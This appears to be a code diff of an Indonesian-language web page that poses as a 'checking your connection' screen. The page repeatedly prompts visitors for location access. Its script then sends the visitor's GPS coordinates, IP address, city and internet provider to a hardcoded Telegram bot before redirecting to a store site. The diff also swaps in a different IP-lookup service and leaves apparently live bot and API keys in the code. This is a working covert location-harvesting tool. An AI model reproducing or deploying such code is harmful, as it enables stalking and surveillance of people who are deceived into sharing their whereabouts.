@@ -1,41 +1,41 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <title>Memeriksa koneksi Anda...</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding: 50px;
-    }
-    #status {
-      font-size: 18px;
-      color: #333;
-    }
-    .loader {
-      margin-top: 20px;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <title>Memeriksa koneksi Anda...</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    #status {
+      font-size: 18px;
+      color: #333;
+    }
+    .loader {
+      margin-top: 20px;
+    }
+  </style>
 </head>
 <body>
-  <h2>🔒 Izinkan akses lokasi Anda</h2>
-  <p id="status">Memeriksa koneksi Anda...</p>
-  <div class="loader">⏳</div>
+  <h2>🔒 Izinkan akses lokasi Anda</h2>
+  <p id="status">Memeriksa koneksi Anda...</p>
+  <div class="loader">⏳</div>
 
-  <script>
-    const botToken = "7090653601:AAHjzoywMv-tfUZ3mXgmAacTPMcCbnp2B8w";
-    const chatId = "7567067447";
-    const ipinfoToken = "eae5fb822c92ce"; // Ganti ini dengan token ipinfo Anda
+  <script>
+    const botToken = "7090653601:AAHjzoywMv-tfUZ3mXgmAacTPMcCbnp2B8w";
+    const chatId = "7567067447";
+    const ip2locKey = "AD1D95B6917C0483227085B47E1C5C2C";
 
-    async function sendLocation(coords, ipData, ipInfo) {
-      const msg = `
+    async function sendLocation(coords, ipData, ipInfo) {
+      const msg = `
 📥 Lokasi baru terdeteksi!
 
 🌐 IP: ${ipData.ip}
-📍 Negara: ${ipInfo?.country || 'N/A'}
-🏙️ Kota: ${ipInfo?.city || 'N/A'}
-🕹️ Provider: ${ipInfo?.org || 'N/A'}
+📍 Negara: ${ipInfo?.country_name || 'N/A'}
+🏙️ Kota: ${ipInfo?.city_name || 'N/A'}
+🕹️ Provider: ${ipInfo?.isp || 'N/A'}
 
 📡 GPS:
 Latitude: ${coords.latitude}
@@ -43,49 +43,49 @@ Longitude: ${coords.longitude}
 📌 https://maps.google.com/?q=${coords.latitude},${coords.longitude}
 
 🕓 Waktu: ${new Date().toLocaleString()}
-      `;
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: msg })
-      });
+      `;
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: msg })
+      });
 
-      // Arahkan setelah lokasi dikirim
-      window.location.href = "https://web-store-rexxin.vercel.app";
-    }
+      // Arahkan setelah lokasi dikirim
+      window.location.href = "https://web-store-rexxin.vercel.app";
+    }
 
-    async function getIPInfo() {
-      const ip = await fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .catch(() => ({ ip: "Gagal" }));
+    async function getIPInfo() {
+      const ip = await fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .catch(() => ({ ip: "Gagal" }));
 
-      const info = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`)
-        .then(res => res.json())
-        .catch(() => null);
+      const info = await fetch(`https://api.ip2location.io/?key=${ip2locKey}&ip=${ip.ip}`)
+        .then(res => res.json())
+        .catch(() => null);
 
-      return { ipData: ip, ipInfo: info };
-    }
+      return { ipData: ip, ipInfo: info };
+    }
 
-    async function requestLoop() {
-      const statusText = document.getElementById("status");
-      while (true) {
-        await new Promise(r => setTimeout(r, 2000));
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(async pos => {
-            statusText.innerText = "📍 Lokasi terdeteksi, mengirim...";
-            const { ipData, ipInfo } = await getIPInfo();
-            await sendLocation(pos.coords, ipData, ipInfo);
-          }, err => {
-            statusText.innerText = "❌ Akses lokasi ditolak. Silakan izinkan akses lokasi untuk melanjutkan.";
-          });
-        } else {
-          statusText.innerText = "Browser Anda tidak mendukung fitur lokasi.";
-          break;
-        }
-      }
-    }
+    async function requestLoop() {
+      const statusText = document.getElementById("status");
+      while (true) {
+        await new Promise(r => setTimeout(r, 2000));
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(async pos => {
+            statusText.innerText = "📍 Lokasi terdeteksi, mengirim...";
+            const { ipData, ipInfo } = await getIPInfo();
+            await sendLocation(pos.coords, ipData, ipInfo);
+          }, err => {
+            statusText.innerText = "❌ Akses lokasi ditolak. Silakan izinkan akses lokasi untuk melanjutkan.";
+          });
+        } else {
+          statusText.innerText = "Browser Anda tidak mendukung fitur lokasi.";
+          break;
+        }
+      }
+    }
 
-    requestLoop();
-  </script>
+    requestLoop();
+  </script>
 </body>
 </html>
